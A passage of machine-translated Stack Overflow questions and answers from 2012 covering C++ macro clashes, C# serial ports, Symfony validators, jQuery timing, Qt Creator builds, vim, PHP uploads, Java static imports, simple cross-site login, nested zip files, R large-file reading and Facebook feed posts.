namespace HEDGE {
    using namespace GeneralAviation; 

    class AisTarget : public WaypointLatLon {
        public:
            static const int NO_DATA = -1000; //here is the error
    };    
} // end namespace HEDGE

#endif 
```

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-08-02T16:45:53.357

它很可能`NO_DATA`已经在别处定义为宏，因此它正在扩展为与编译器的变量名概念不一致的东西。尝试重命名`NO_DATA`为其他名称。

如果没有这样的冲突，那么代码就可以正常编译，如此处[所示](http://ideone.com/8FJ4e)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-04-21T07:32:58.190

即使这篇文章已经过时了：当多个重新定义（即使不分大小写）共存时，通常也会发生错误。**这包括解决方案的*.vcprojx*文件中的潜在预处理器定义！**. 考虑类似的东西

```
 <ItemDefinitionGroup>
    <ClCompile>
      <PreprocessorDefinitions>$(Configuration);%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
  </ItemDefinitionGroup> 
```

在上述文件中。现在，有了“调试”和“发布”配置，您很可能会遇到一些问题和 C2059 错误的潜在来源。我经历了这种两难境地。

# c# - 串口等待响应

> ID：11782053
> 
> 赞同：0
> 
> 时间：2012-08-02T16:41:31.703
> 
> 标签：c#, port

我们在 .NET 4.0 中是否有机会等待响应然后返回响应？

目前我正在这样做，但它不是很好，我不喜欢它：

```
public partial class MainWindow : Window
{
    public MainWindow()
    {
        InitializeComponent();
        byte[] options = new byte[]{1,1,0};
        COMManager mgr = new COMManager("COM1");

        byte[] result = mgr.GetResponse(options);
    }
} 
```

还有我的 COM 管理器类（我必须在单独的类（dll）中进行操作）：

```
public class COMManager
    {
        SerialPort sp = null;
        byte[] result = null;
        bool completed = false;

        public COMManager(string comport)
        {
            sp = new SerialPort(comport);
            sp.DataReceived +=new SerialDataReceivedEventHandler(sp_DataReceived);
        }

        public byte[] GetResponse(byte[] option)
        {
            sp.Write(option, 0, option.Length);
            //I don't like the way...
            while (!completed) { }
            completed = false;
            return result;
        }

        void  sp_DataReceived(object sender, SerialDataReceivedEventArgs e)
        {
            result = new byte[sp.BytesToRead];
            sp.Read(result, 0, sp.BytesToRead);
            completed = true;
        }
    } 
```

在 .NET 4.5 中，我们可能有机会使用“await”语句。但是对于当前项目，我们只允许使用 .NET 4.0。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T16:54:35.857

如果您不想异步读取，则使用 DataReceived 事件是没有意义的。只需在 GetResponse() 中直接调用 Read() 方法即可。

注意你不能假设你会得到一个完整的响应，你不能忽略 Read() 的返回值。它通常只返回几个字节，串行端口非常慢。所以一定要继续调用 Read() 直到你得到整个响应。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T16:46:16.277

干净的方法是等待`AutoResetEvent`和等待接收回调发出信号。

通过使用此方法创建包装器，您可以有效地`await`在每个版本的 .Net 中。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T16:47:52.467

对于您最初的问题，要阻止执行线程，您可以使用[ManualResetEvent](http://msdn.microsoft.com/en-us/library/system.threading.manualresetevent.aspx)或[AutoResetEvent](http://msdn.microsoft.com/en-us/library/system.threading.autoresetevent.aspx)，这将`Set`在您获得响应时获得。页面上有一个相当好的解释。

对于线程，经验法则是，如果您不是非常清楚自己在做什么，请不要这样做。

当您可以访问事件时同步阻塞似乎是一种浪费。考虑到数据是一个流，这可能最终难以维护抽象。

[这里](https://stackoverflow.com/questions/55026042/wait-for-response-from-the-serial-port-and-then-send-next-data/55156180#55156180)有一个例子对上述想法有更长的解释。

您也可以与`TaskCompletionSource`. 您可以调用而不是 set ，`SetResult`然后等待`.Task`，但想法几乎相同。

# validation - 如何在 symfony2 中验证实体集合中的唯一实体

> ID：11782056
> 
> 赞同：14
> 
> 时间：2012-08-02T16:41:42.000
> 
> 标签：validation, symfony

我有一个与另一个实体具有 OneToMany 关系的实体，当我坚持父实体时，我想确保子实体不包含重复项。

这是我一直在使用的类，*折扣*集合不应包含给定客户具有相同名称的两个产品。

我有一个带有折扣集合的客户实体：

```
/**
 * @ORM\Entity
 */
class Client {

    /**
     * @ORM\Id
     * @ORM\Column(type="integer")
     * @ORM\GeneratedValue(strategy="AUTO")
     */
    protected $id;

    /**
     * @ORM\Column(type="string", length=128, nullable="true")
     */
    protected $name;

    /**
     * @ORM\OneToMany(targetEntity="Discount", mappedBy="client", cascade={"persist"}, orphanRemoval="true")
     */
    protected $discounts;

}

/**
 * @ORM\Entity
 * @UniqueEntity(fields={"product", "client"}, message="You can't create two discounts for the same product")
 */
    class Discount {
        /**
         * @ORM\Id
         * @ORM\Column(type="string", length=128, nullable="true")
         */
        protected $product;

        /**
         * @ORM\Id
         * @ORM\ManyToOne(targetEntity="Client", inversedBy="discounts")
         * @ORM\JoinColumn(name="client_id", referencedColumnName="id")
         */
        protected $client;

        /**
         * @ORM\Column(type="decimal", scale=2)
         */
        protected $percent;
    } 
```

如您所见，我尝试将[UniqueEntity](http://symfony.com/doc/current/reference/constraints/UniqueEntity.html)用于 Discount 类，问题是验证器似乎只检查数据库上加载的内容（为空），所以当实体被持久化时，我得到一个“SQLSTATE [23000]：完整性违反约束”。

我已经检查了[Collection](http://symfony.com/doc/current/reference/constraints/Collection.html)约束购买它似乎只处理字段集合，而不是实体。

还有[All](http://symfony.com/doc/current/reference/constraints/All.html)验证器，它允许您定义要应用于每个实体的约束，但不能应用于整个集合。

在持久化到数据库之前，我需要知道整体上是否存在实体集合约束，而不是每次编写[自定义验证器](http://symfony.com/doc/current/cookbook/validation/custom_constraint.html)或编写[回调验证器。](http://symfony.com/doc/current/reference/constraints/Callback.html)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-04T09:50:04.723

我为此创建了一个自定义约束/验证器。

[它使用“ All](http://symfony.com/doc/current/reference/constraints/All.html) ”断言验证表单集合，并采用可选参数：属性的属性路径来检查实体是否相等。

**（它适用于 Symfony 2.1，使其适应 Symfony 2.0 检查答案的结尾）**：

有关创建自定义验证约束的更多信息，请查看[The Cookbook](http://symfony.com/doc/current/cookbook/validation/custom_constraint.html)

约束：

```
#src/Acme/DemoBundle/Validator/constraint/UniqueInCollection.php
<?php

namespace Acme\DemoBundle\Validator\Constraint;

use Symfony\Component\Validator\Constraint;

/**
* @Annotation
*/
class UniqueInCollection extends Constraint
{
    public $message = 'The error message (with %parameters%)';
    // The property path used to check wether objects are equal
    // If none is specified, it will check that objects are equal
    public $propertyPath = null;
} 
```

和验证器：

```
#src/Acme/DemoBundle/Validator/constraint/UniqueInCollectionValidator.php
<?php

namespace Acme\DemoBundle\Validator\Constraint;

use Symfony\Component\Validator\Constraint;
use Symfony\Component\Validator\ConstraintValidator;
use Symfony\Component\Form\Util\PropertyPath;

class UniqueInCollectionValidator extends ConstraintValidator
{

    // We keep an array with the previously checked values of the collection
    private $collectionValues = array();

    // validate is new in Symfony 2.1, in Symfony 2.0 use "isValid" (see below)
    public function validate($value, Constraint $constraint)
    {
        // Apply the property path if specified
        if($constraint->propertyPath){
            $propertyPath = new PropertyPath($constraint->propertyPath);
            $value = $propertyPath->getValue($value);
        }

        // Check that the value is not in the array
        if(in_array($value, $this->collectionValues))
            $this->context->addViolation($constraint->message, array());

        // Add the value in the array for next items validation
        $this->collectionValues[] = $value;
    }
} 
```

在你的情况下，你会像这样使用它：

```
use Acme\DemoBundle\Validator\Constraints as AcmeAssert;

// ...

/**
 * @ORM\OneToMany(targetEntity="Discount", mappedBy="client", cascade={"persist"}, orphanRemoval="true")
 * @Assert\All(constraints={
 *     @AcmeAssert\UniqueInCollection(propertyPath ="product")
 * })
 */ 
```

对于 Symfony 2.0，将**validate**函数更改为：

```
public function isValid($value, Constraint $constraint)
{
        $valid = true;

        if($constraint->propertyPath){
            $propertyPath = new PropertyPath($constraint->propertyPath);
            $value = $propertyPath->getValue($value);
        }

        if(in_array($value, $this->collectionValues)){
            $valid = false;
            $this->setMessage($constraint->message, array('%string%' => $value));
        }

        $this->collectionValues[] = $value;

        return $valid

} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2019-09-17T09:07:45.703

对于 Symfony 4.3（仅经过测试的版本），您可以使用我的自定义验证器。首选的使用方式是作为验证集合的注释：

```
use App\Validator\Constraints as App; 
```

...

```
/**
 * @ORM\OneToMany
 *
 * @App\UniqueProperty(
 *     propertyPath="entityProperty"
 * )
 */
private $entities; 
```

Julien 和我的解决方案之间的区别在于，我的约束是在经过验证的 Collection 上定义的，而不是在 Collection 本身的元素上定义的。

约束：

```
#src/Validator/Constraints/UniqueProperty.php
<?php

namespace App\Validator\Constraints;

use Symfony\Component\Validator\Constraint;

/**
 * @Annotation
 */
class UniqueProperty extends Constraint
{
    public $message = 'This collection should contain only elements with uniqe value.';
    public $propertyPath;

    public function validatedBy()
    {
        return UniquePropertyValidator::class;
    }
} 
```

验证器：

```
#src/Validator/Constraints/UniquePropertyValidator.php
<?php

namespace App\Validator\Constraints;

use Symfony\Component\PropertyAccess\PropertyAccess;
use Symfony\Component\Validator\Constraint;
use Symfony\Component\Validator\ConstraintValidator;
use Symfony\Component\Validator\Exception\UnexpectedTypeException;
use Symfony\Component\Validator\Exception\UnexpectedValueException;

class UniquePropertyValidator extends ConstraintValidator
{
    /**
     * @var \Symfony\Component\PropertyAccess\PropertyAccessor
     */
    private $propertyAccessor;

    public function __construct()
    {
        $this->propertyAccessor = PropertyAccess::createPropertyAccessor();
    }

    /**
     * @param mixed $value
     * @param Constraint $constraint
     * @throws \Exception
     */
    public function validate($value, Constraint $constraint)
    {
        if (!$constraint instanceof UniqueProperty) {
            throw new UnexpectedTypeException($constraint, UniqueProperty::class);
        }

        if (null === $value) {
            return;
        }

        if (!\is_array($value) && !$value instanceof \IteratorAggregate) {
            throw new UnexpectedValueException($value, 'array|IteratorAggregate');
        }

        if ($constraint->propertyPath === null) {
            throw new \Exception('Option propertyPath can not be null');
        }

        $propertyValues = [];
        foreach ($value as $key => $element) {
            $propertyValue = $this->propertyAccessor->getValue($element, $constraint->propertyPath);
            if (in_array($propertyValue, $propertyValues, true)) {
                $this->context->buildViolation($constraint->message)
                    ->atPath(sprintf('[%s]', $key))
                    ->addViolation();
            }

            $propertyValues[] = $propertyValue;
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2020-06-06T13:21:16.830

这是一个使用多个字段的版本，就像 UniqueEntity 一样。如果多个对象具有相同的值，则验证失败。

用法：

```
/**
* ....
* @App\UniqueInCollection(fields={"name", "email"})
*/
private $contacts;
//Validation fails if multiple contacts have same name AND email 
```

约束类...

```
<?php
namespace App\Validator\Constraints;

use Symfony\Component\Validator\Constraint;

/**
 * @Annotation
 */
class UniqueInCollection extends Constraint
{
    public $message = 'Entry is duplicated.';
    public $fields;

    public function validatedBy()
    {
        return UniqueInCollectionValidator::class;
    }
} 
```

验证器本身....

```
<?php

namespace App\Validator\Constraints;

use Symfony\Component\PropertyAccess\PropertyAccess;
use Symfony\Component\Validator\Constraint;
use Symfony\Component\Validator\ConstraintValidator;
use Symfony\Component\Validator\Exception\UnexpectedTypeException;
use Symfony\Component\Validator\Exception\UnexpectedValueException;

class UniqueInCollectionValidator extends ConstraintValidator
{
    /**
     * @var \Symfony\Component\PropertyAccess\PropertyAccessor
     */
    private $propertyAccessor;

    public function __construct()
    {
        $this->propertyAccessor = PropertyAccess::createPropertyAccessor();
    }

    /**
     * @param mixed $collection
     * @param Constraint $constraint
     * @throws \Exception
     */
    public function validate($collection, Constraint $constraint)
    {
        if (!$constraint instanceof UniqueInCollection) {
            throw new UnexpectedTypeException($constraint, UniqueInCollection::class);
        }

        if (null === $collection) {
            return;
        }

        if (!\is_array($collection) && !$collection instanceof \IteratorAggregate) {
            throw new UnexpectedValueException($collection, 'array|IteratorAggregate');
        }

        if ($constraint->fields === null) {
            throw new \Exception('Option propertyPath can not be null');
        }

        if(is_array($constraint->fields)) $fields = $constraint->fields;
        else $fields = [$constraint->fields];

        $propertyValues = [];
        foreach ($collection as $key => $element) {
            $propertyValue = [];
            foreach ($fields as $field) {
                $propertyValue[] = $this->propertyAccessor->getValue($element, $field);
            }

            if (in_array($propertyValue, $propertyValues, true)) {

                $this->context->buildViolation($constraint->message)
                    ->atPath(sprintf('[%s]', $key))
                    ->addViolation();
            }

            $propertyValues[] = $propertyValue;
        }

    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-03-02T10:21:25.417

我无法使之前的答案适用于 symfony 2.6。由于 l 上的以下代码。852 的，当 2 项相等时`RecursiveContextualValidator`，它只在方法上执行一次。`validate`

```
if ($context->isConstraintValidated($cacheKey, $constraintHash)) {
    continue; 
} 
```

因此，这是我为处理原始问题所做的工作：

在实体上：

```
* @AcmeAssert\UniqueInCollection(propertyPath ="product") 
```

代替

```
* @Assert\All(constraints={
*     @AcmeAssert\UniqueInCollection(propertyPath ="product")
* }) 
```

在验证器上：

```
public function validate($collection, Constraint $constraint){

    $propertyAccessor = PropertyAccess::getPropertyAccessor(); 

    $previousValues = array();
    foreach($collection as $collectionItem){
        $value = $propertyAccessor->getValue($collectionItem, $constraint->propertyPath);
        $previousSimilarValuesNumber = count(array_keys($previousValues,$value));
        if($previousSimilarValuesNumber == 1){
            $this->context->addViolation($constraint->message, array('%email%' => $value));
        }
        $previousValues[] = $value;
    }

} 
```

代替 ：

```
public function isValid($value, Constraint $constraint)
{
    $valid = true;

    if($constraint->propertyPath){
        $propertyAccessor = PropertyAccess::getPropertyAccessor(); 
        $value = $propertyAccessor->getValue($value, $constraint->propertyPath);
    }

    if(in_array($value, $this->collectionValues)){
        $valid = false;
        $this->setMessage($constraint->message, array('%string%' => $value));
    }

    $this->collectionValues[] = $value;

    return $valid

} 
```

# javascript - javascript函数之间的jquery延迟

> ID：11782057
> 
> 赞同：-1
> 
> 时间：2012-08-02T16:41:42.733
> 
> 标签：javascript, jquery, delay

我有参数简化为的乘法函数：

```
 function f1(p1,p2){
        alert('Function one is P1:'+p1+' P2:'+p2);        
    }
    function f2(p1,p2){
        alert('Function two is P1:'+p1+' P2:'+p2);
    } 
```

我需要触发这些是一个有延迟的序列。然而，我发现 jQuery 不喜欢使用参数运行函数。我已经尝试过 .click 功能。

```
$.delay(1000).click(f1('One',false)).delay(1000).click(f2('One',false)); 
```

但是延迟使得点击功能不起作用......

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-02T16:42:51.320

我只会使用一个简单的超时：

```
f1("one", false);
setTimeout(function() { f2("one", false); }, 1000); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T16:45:05.850

```
$.delay(1000).click(function(){f1('One',false);}).delay(1000).click(function(){f2('One',false);}); 
```

不知道点击是为了什么......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T16:46:09.177

如果您想延迟函数调用，那么更简单的方法是使用 setTimeout()。

eg: // 在嵌套的 setTimeout 中调用它以实现顺序延迟执行 setTimeout(function(){

```
 f1('One',false);
  setTimeout(function(){
    f1('One',false)
  },300)
},300) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T16:55:36.260

```
function fn1()
{
    alert(1);
}
function fn2()
{
    alert(2);
}
var arr=[fn1,fn2];
var len=arr.length;
var time=1000;
for(var k=0;k<len;k++)
{
    (function(k)
    {
        setTimeout(arr[k],time);
    }(k))
    time=time*2;
} 
```

它在延迟 1 秒后执行！ [演示](http://jsfiddle.net/mtvY9/)

# qt - Qt Creator 和条件构建

> ID：11782060
> 
> 赞同：2
> 
> 时间：2012-08-02T16:42:03.193
> 
> 标签：qt, qt-creator

在我们的项目中，如果定义了 MACRO，我们会添加一些源文件和头文件。我们这样做，在 .pro 文件中：

```
contains(DEFINES, MY_DEF) {
message("Support MY_DEF")
INCLUDEPATH += \
    my_include_dir
SOURCES += \
    source1.cpp \
    source2.cpp
HEADERS +=  \
    my_include_dir/header1.h \
    my_include_dir/header2.h
FORMS +=  \
    myform.ui
} 
```

这在构建期间工作正常。如果未定义 MY_DEF，则不会编译文件。MY_DEF 是这样定义的：

```
DEFINES += MY_DEF 
```

奇怪的是，Qt Creator 总是在项目树中显示文件，而 MY_DEF 是否已定义。如果没有定义，它们不会用于构建，但它们仍然可以显示和编辑，搜索可以扫描它们等等......这是 Qt Creator 的错误吗？

这不是什么大问题，只是有点烦人，因为我们不清楚一个文件是否是项目的一部分。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T12:18:26.293

甚至是故意的。有一种特殊的“累积”解析模式来收集 .pro 文件中提到的所有文件（与用于收集“可翻译字符串”的文件基本相同）以显示在项目树中。否则，诸如“在项目中的所有文件中替换”之类的内容会根据平台或运行它的上下文产生不同的结果。[而且它不是包含 qmake 的一半，而是接近全部...]

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T16:51:40.207

这似乎是 QtCreator 以及它如何读取 .pro 文件的问题 - 它似乎实际上并没有完全解析文件，而是选择只挑选某些位。对于仅包含在一个或另一个平台上的文件，我也遇到了同样的问题——在 QtCreator 中，它们总是出现。

我希望原因是他们不想重新实现 qmake 的一半只是为了获取文件列表，或者在某些情况下尝试“正确”解析它会得到错误的答案，而且他们已经选择是可预见的错误而不是随机错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-01-05T17:21:08.333

除了 QMake 中的条件包含之外，我还在此类条件源代码周围添加了#ifdef。这样，当不满足条件时，我也可以直观地看到它退出编译。这不如让文件完全从项目树中删除，但如果它们不适用，则在编辑它们时让它们仍然看起来像它们是构建的一部分要好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-11-15T19:07:55.513

只是为了完整性和答案的正确性。可能其他人需要这个带有条件源树的根 .pro 文件示例：

```
TEMPLATE = subdirs
SUBDIRS = device

CONFIG -= debug_and_release

_SANDBOX_DIR = $$dirname(PWD)
_PLAYER_PRO = $${_SANDBOX_DIR}/player/player.pro

SUBDIRS = device

device.subdir = $${_SANDBOX_DIR}/proxy/libproxy

contains(QMAKE_PLATFORM, android) {
    unset(_PLAYER_PRO)
} else {
    SUBDIRS += player

    player.file = $${_PLAYER_PRO}
    player.depends = device
}

SUBDIRS += app

app.subdir = $${_SANDBOX_DIR}/display/display
app.depends = device

contains(SUBDIRS, player) {
    app.depends += player
} 
```

# vim - 如何为 vim 插件窗口设置某些选项？

> ID：11782070
> 
> 赞同：1
> 
> 时间：2012-08-02T16:43:04.433
> 
> 标签：vim, nerdtree, vim-plugin

我使用 NerdTree 插件并`set cursorcolumn`在我的 vimrc 文件中有，但我不想在 NerdTreePlugin 窗口中突出显示列，我该怎么做？

另外，我不想在 nerdtree 窗口中显示标志列，我该怎么做？

更常见的问题是，如何设置或禁用特定插件窗口的特定选项，例如 NerdTree 或 Tagbar？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T16:46:42.963

如果你想要`cursorcolumn`除少数之外的所有缓冲区，`autocmd`请在 vimrc 中使用 an 为特定缓冲区禁用它，使用`setlocal`.

例如：

```
autocmd FileType nerdtree setlocal nocursorcolumn 
```

# php - chmod 777 目录上的 move_file_uploaded 权限被拒绝？

> ID：11782071
> 
> 赞同：1
> 
> 时间：2012-08-02T16:43:07.290
> 
> 标签：php

我似乎无法让上传工作，所以我将上传目录更改为日志目录。请注意，日志已成功写入，但我仍然无法将文件上传到该目录。

ls -lh

```
drwxrwxr--  2 <user> http 216 Aug  2 10:19 logs 
```

我已经通过直接从错误消息中复制路径，将其粘贴到终端，然后 cd'ing 来检查路径。这是一个绝对路径名。

我在脚本上做了一个 whoami，它被报告为 http。

这是在使用 Apache 和 mod_php 的虚拟主机目录中。PHP 版本 5.4.4，使用 Arch Linux。

有任何想法吗？我完全不知道接下来应该检查什么。我什至先创建了文件，但仍然出现错误。

我还应该提到父目录为组设置了粘性位。我不知道这是否会影响任何事情。

这是实际的错误消息：

```
<b>Warning</b>:  move_uploaded_file(!!snip!!): failed to open stream: Permission denied in <b>!!snip!!</b> on line <b>29</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move '/tmp/phpYSMakQ' to '!!snip!!' in <b>!!snip!!</b> on line <b>29</b><br /> 
```

# jquery - jsTree -- 在复选框树中添加按钮

> ID：11782075
> 
> 赞同：3
> 
> 时间：2012-08-02T16:43:29.810
> 
> 标签：jquery, button, checkbox, jstree

我使用 jstree 创建了一个复选框树，我想在右侧添加一列按钮，例如“编辑”按钮，它链接到另一个页面，您可以在其中添加有关此复选框项目的更多详细信息。我应该如何在jstree中做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T06:35:25.357

您可以使用[jsTreeGrid](https://github.com/deitch/jstree-grid)来实现您想要的。查看示例[http://jsfiddle.net/radek/4fTDq/](http://jsfiddle.net/radek/4fTDq/)

# java - 仅从类和接口静态导入

> ID：11782076
> 
> 赞同：27
> 
> 时间：2012-08-02T16:43:43.800
> 
> 标签：java, static-import

我的代码在 Eclipse 中编译得很好，但是当我尝试从命令行编译时（通过我们基于 ruby​​ 的构建器系统），我收到以下错误消息：

```
static import only from classes and interfaces 
```

建议不允许静态导入公共静态字段。我应该寻找什么来帮助诊断这个问题？我该如何解决？

**更新：** 根据@Ted 的要求，引用文件中的常量声明：

```
public static final String NULL = "<NULL>"; 
```

和引用文件中的（bowdlerized）引用：

```
import static my.path.MyClass.NULL; 
```

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-08-02T16:52:29.740

我的猜测是 Eclipse 和 buildr 使用不同的 Java 编译器版本或不同的编译器标志。Java 7 编译器中存在一个错误（[错误 ID：715906](http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=7159016)），当您静态导入特定字段时会生成此错误。解决方法是使用通配符静态导入。所以而不是：

```
import static pkg.Class.staticField; 
```

做这个：

```
import static pkg.Class.*; 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-11-13T17:25:49.223

迟到的答案，但我刚刚遇到了类似的问题并想通了。我会发布以防万一它可以帮助找到此页面的其他人...

在大合并和重构之后，我不小心将测试类放入 src/main/java 而不是 src/test/java 时，我遇到了类似的错误。由于 JUnit 依赖项是 scope=tests，因此它在纯 maven 中不起作用。也许你有同样的问题

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2018-11-14T19:03:54.790

我也有这个错误，我的问题原来是我的测试源文件中一个 junit 4 包的任性静态导入。

我有以下内容：

```
import static org.junit.Assert.fail;
import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTimeout; 
```

我删除了`import static org.junit.Assert.fail;`（不知道我是如何设法把它放在那里的），现在一切正常。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-08-19T08:29:15.783

我不小心将`test`目录设置为源。并且测试源被视为源文件。

```
sourceSets.main.java.srcDirs 'src' 
```

| -- 源代码
  | -- 主要
  | - 测试

使固定：

```
sourceSets.main.java.srcDirs 'src/main' 
```

# authentication - 简单的跨站共享登录

> ID：11782082
> 
> 赞同：0
> 
> 时间：2012-08-02T16:44:02.483
> 
> 标签：authentication, login, single-sign-on

目前正在与一个潜在的合作伙伴合作，该合作伙伴的技术准入门槛很高。我们想要合并一个跨站点登录，但 SSO/Oauth 可能有点难以解决。

关于安全且轻量级的令牌传递/握手的任何建议？我们不需要像 Oauth 这样的无缝集成，他们只需点击一个站点并登录，拥有一个将他们带到另一个站点的标记化 URL 就可以了

有点像过去你用键/值访问远程站点 - 他们会确认你并返回 1/0 ......当然，这有潜在的中间人攻击

有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T06:33:38.193

像openid那样做怎么样？

首先，服务提供者和身份提供者共享密钥（[http://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange](http://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange)）。这是服务器到服务器的通信。

然后进行身份验证，用户名密码 blah blah blah 像往常一样填写

然后身份提供者向服务提供者发送 http 重定向（用户可以看到正在发生的事情），其中包含所有必要的信息（用户的身份、时间戳等）+ 消息验证码（由所有那些必要的信息和由 diffie 交换的密钥组成） -hellman 交换）。[请参阅http://en.wikipedia.org/wiki/Message_authentication_code](http://en.wikipedia.org/wiki/Message_authentication_code)上的消息身份验证代码

然后服务提供者验证该 mac 代码（因为这个服务提供者知道密钥），以确保这个 http 请求真正来自身份提供者的重定向

# java - 如何在不创建任何新文件的情况下访问 zip 文件目录中的文件？

> ID：11782083
> 
> 赞同：0
> 
> 时间：2012-08-02T16:44:01.220
> 
> 标签：java, zip, unzip, zipfile

我正在开发一个 java 项目，该项目需要我访问多个嵌入式 zip 文件和目录中的文件。

例如，archive1.zip/archive1/archive2.zip/archive2/directory1/file_that_I_need.txt。

如果在提取每个 zip 文件时，它会立即列出其内容，但里面有一个包含所有内容的文件夹，这会容易得多。

我在网上找到的示例处理 zip 文件，这些文件在提取时包含他们需要访问的文件，但我找不到任何处理访问 zip 文件目录中的文件的示例。对此的任何建议都会很棒。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T16:53:13.910

鉴于禁止创建新文件，您几乎被[ZipInputStream](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/zip/ZipInputStream.html)所困扰。当您找到与`ZipEntry`嵌入存档相对应的文件时，您可以读取其流以找到实际文件。您可以根据需要递归处理任意多个级别的存档。

如果您要处理单个文件，这可以正常工作。但是，重新读取多个文件的存档可能会很昂贵。更好的解决方案是至少以[ZipFile](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/zip/ZipFile.html)的形式打开外部存档，该文件对实际文件进行内存映射。

如果您随后可以将包含的存档解压缩到一个临时目录中并以`ZipFile`s 的形式打开它们，您可能会看到速度大大提高（只要您从每个嵌入式存档中提取多个文件）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T16:55:36.913

您还可以查看[http://truezip.java.net/](http://truezip.java.net/) 我使用的是它的旧版本，它比 Java 内置的支持功能强大得多。我认为还有一个 Apache Commons 库用于从嵌套归档结构中读取文件。

# r - 在 r 中读取大文本文件

> ID：11782084
> 
> 赞同：5
> 
> 时间：2012-08-02T16:44:02.637
> 
> 标签：r

我想读取一个包含 110,000,000 行和 8 列的大型 ido 文件。这些列由 2 个整数列和 6 个逻辑列组成。文件中使用了分隔符`"|"`。我尝试使用`read.big.matrix`它并花了很长时间。我也试过`dumpDf`了，内存用完了。我试过`ff`了，我听说这是一个很好的包，但我正在努力解决错误。如果我能以某种方式阅读它，我想对这张表做一些分析。如果有人有任何建议，那就太好了。亲切的问候，洛肯

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-10T11:21:34.407

感谢您的所有建议。我设法弄清楚为什么我无法使错误起作用。我会给你所有的答案和建议，所以没有人会再犯我愚蠢的错误。

首先，提供给我的数据中包含一些错误，所以我从一开始就注定要失败。直到一位同事在另一款软件中发现它时，我才意识到这一点。在包含整数的列中，有一些字母，因此当`read.table.ff`包试图读取数据集时，它不知何故感到困惑，或者我不知道。无论如何，尽管我得到了另一个数据样本，16,000,000 行和 8 列具有正确的条目，并且它运行良好。我运行的代码如下，花了大约 30 秒阅读：

```
setwd("D:/data test")
library(ff)
ffdf1 <- read.table.ffdf(file = "test.ido", header = TRUE,  sep = "|") 
```

感谢大家的宝贵时间，如果您对答案有任何疑问，请随时提出，我会尽力提供帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-06T08:44:58.553

您真的需要所有数据进行分析吗？也许你可以聚合你的数据集（比如从分钟值到每日平均值）。这种聚合只需要完成一次，并且有望分块完成。这样，您确实需要一次将所有数据加载到内存中。

可以使用 来分块读取`scan`，重要的参数是`skip`和`n`。或者，将您的数据放入数据库并以这种方式提取数据块。您甚至可以使用`plyr`包中的函数来并行运行块，请参阅我的[这篇博客文章](http://www.numbertheory.nl/2011/11/14/parallelization-using-plyr-loading-objects-and-packages-into-worker-nodes/)作为示例。

# facebook - 发布带有链接的提要，但没有“共享为链接”

> ID：11782087
> 
> 赞同：3
> 
> 时间：2012-08-02T16:44:17.693
> 
> 标签：facebook, facebook-graph-api, feed

我在发布这个问题之前搜索了一个小时，所以如果这是一个基本的、密集的问题，请提前原谅我。我觉得一定有一些简单的事情我没有绕圈子。

我看到很多应用程序，例如“WeForPresident”，加入时会发布一个简单的提要。它不包含特殊格式，仅包含图像、指向外部站点的链接和一些文本。

我找不到使用图形 api 执行此操作的方法。当我使用链接参数发布时，我得到了“共享链接”格式，这是不受欢迎的。然而，使用消息参数不允许链接。

那么，WeForPresident 等 App 是如何实现这种效果的呢？

再次感谢。

* * *

赏金信息

使用带有消息、链接、描述、图片、名称的 /TEST_USER_ID/feed

帖子作为链接

![链接为](../Images/6571157cce0f72de5bc6e922d725d539.png)

添加了操作参数

![无链接](../Images/83dccddc63e2fca82af822658a197dd9.png)

用户谈论的相关应用程序

![没有](../Images/53b6aab42d763f5d6a50a080ca69c86b.png)

注意帖子中没有提到任何共享

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-16T01:31:59.183

你在谈论这样的事情吗？

![在此处输入图像描述](../Images/2bcf9dbaf9418ea6a6883a3537933af3.png)

这可以通过开放图形对象和操作来实现。这是一个简短的（希望不是非常混乱）细分：

对象：在上图中，对象是“需要家的宠物”。对象是描述您碰巧正在共享的页面的文本，并在您正在共享的页面的标题标签中引用（稍后会详细介绍。）

行动：在上图中，指的是“...**共享**一个需要家的宠物...”中的“共享”。操作是您实际使用开放图形所做的任何事情。我见过一些网站“在某某上**签名**请愿书”或“在某某应用程序上**玩**某某词”。粗体字是动作。

